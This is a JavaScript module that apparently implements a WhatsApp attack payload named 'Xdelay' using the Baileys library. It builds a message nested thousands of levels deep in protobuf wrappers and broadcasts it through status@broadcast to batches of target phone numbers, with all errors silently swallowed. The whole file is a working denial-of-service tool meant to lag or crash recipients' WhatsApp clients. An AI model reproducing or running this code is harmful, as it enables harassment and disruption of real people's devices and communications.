
const { generateWAMessage, generateWAMessageFromContent, proto } = require('@whiskeysockets/baileys');

async function Xdelay(SYxS7, target) {
  try {
    const basePayload = proto.Message.encode(
      proto.Message.fromObject({
        interactiveMessage: {
          body: { text: "福 | ᥴ᥆mᥙᥒі𝗍ყ ᑯᥱ᥎ - 𐌊𐌉𐌍𐌂" },
          contextInfo: {
            isForwarded: true,
            buffer1: Buffer.from([0, 0, 0, 1]),
            buffer2: Buffer.from([0xff, 0, 0, 0x1d]),
            buffer3: Buffer.from([0xff, 0, 0, 0x1e]),
            buffer4: Buffer.from([0xff, 0, 0, 0x1f]),
            buffer5: Buffer.from([0xff, 0, 0, 0x20])
          },
          XForwardedFor: Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255) + "\r\n"
        }
      })
    ).finish();

    const TAGS = [
      [0xBA, 0x03],
      [0xD2, 0x04],
      [0xAA, 0x02]
    ];

    const encodeVarint = function(n) {
      var buf = [];
      while (n >= 0x80) {
        buf.push((n & 0x7f) | 0x80);
        n >>>= 7;
      }
      buf.push(n);
      return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
      return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const inflate = function(tag, depth) {
      var buf = basePayload;
      for (var i = 0; i < depth; i++) {
        buf = wrapLd(tag, wrapLd([0x0A], buf));
      }
      return buf;
    };

    const resolveJid = function(raw) {
      var s = String(raw || '').trim();
      if (s.includes('@')) return s;
      return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    var jids = (Array.isArray(target) ? target : [target]).map(resolveJid).filter(function(j) { return j.length > 15; });
    if (!jids.length) return;

    var MAX_BATCH = 5;
    var DELAY_MS = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
      var chunk = jids.slice(offset, offset + MAX_BATCH);
      if (offset > 0) {
        await new Promise(function(r) { setTimeout(r, DELAY_MS); });
      }
      var idx = Math.floor(offset / MAX_BATCH) + 1;
      var suffix = idx > 1 ? ('-' + idx) : '';
      var msgId = 'crb' + Date.now().toString(36).toUpperCase() + suffix;

      for (var ti = 0; ti < TAGS.length; ti++) {
        var tag = TAGS[ti];
        var payload = null;

        for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
          try {
            var decoded = proto.Message.decode(inflate(tag, depth));
            proto.Message.encode(decoded).finish();
            payload = decoded;
          } catch (_) {}
        }

        if (!payload) continue;

        await SYxS7.relayMessage('status@broadcast', payload, {
          messageId: msgId,
          statusJidList: chunk,
          additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
              tag: 'mentioned_users',
              attrs: {},
              content: chunk.map(function(jid) {
                return { tag: 'to', attrs: { jid: jid }, content: [] };
              })
            }]
          }]
        });

        totalSent++;
      }
    }
  } catch (_) {}
}

module.exports = { Xdelay };
